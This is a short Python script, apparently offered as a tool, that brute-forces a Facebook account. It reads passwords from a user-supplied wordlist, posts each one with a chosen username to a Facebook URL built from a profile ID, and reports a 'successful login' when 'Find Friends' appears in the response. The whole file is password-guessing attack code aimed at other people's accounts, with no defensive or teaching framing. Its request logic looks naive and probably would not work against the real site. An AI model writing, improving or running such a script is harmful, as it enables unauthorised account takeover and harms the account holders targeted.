import requests

def brute_force(username, fb_id, passwords):
    login_url = f'https://www.facebook.com/{fb_id}'
    
    with requests.Session() as session:
        for password in passwords:
            data = {
                'email': username,
                'pass': password,
                'login': 'Log In'
            }

            try:
                response = session.post(login_url, data=data)
                if 'Find Friends' in response.text:
                    print(f'Successful login! Username: {username}, Password: {password}')
                    break
            except requests.RequestException as e:
                print(f'Error during login attempt: {e}')

if __name__ == "__main__":
    username = input("Enter username/email: ")
    fb_id = input("Enter Facebook ID: ")
    password_file = input("Enter the name of the password file: ")

    with open(password_file, 'r') as file:
        passwords = [line.strip() for line in file]

    brute_force(username, fb_id, passwords)






